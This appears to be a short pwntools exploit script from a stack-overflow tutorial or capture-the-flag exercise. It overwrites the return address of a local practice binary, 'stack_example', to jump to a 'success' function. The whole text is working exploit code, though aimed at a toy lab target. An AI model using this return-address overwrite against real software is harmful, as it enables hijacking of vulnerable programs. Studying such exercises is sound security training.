from pwn import *
success_addr = 0x804843B
p = process('./stack_example')
payload = 'a'*(0x14+0x4)+p32(success_addr)
p.sendline(payload)
p.interactive()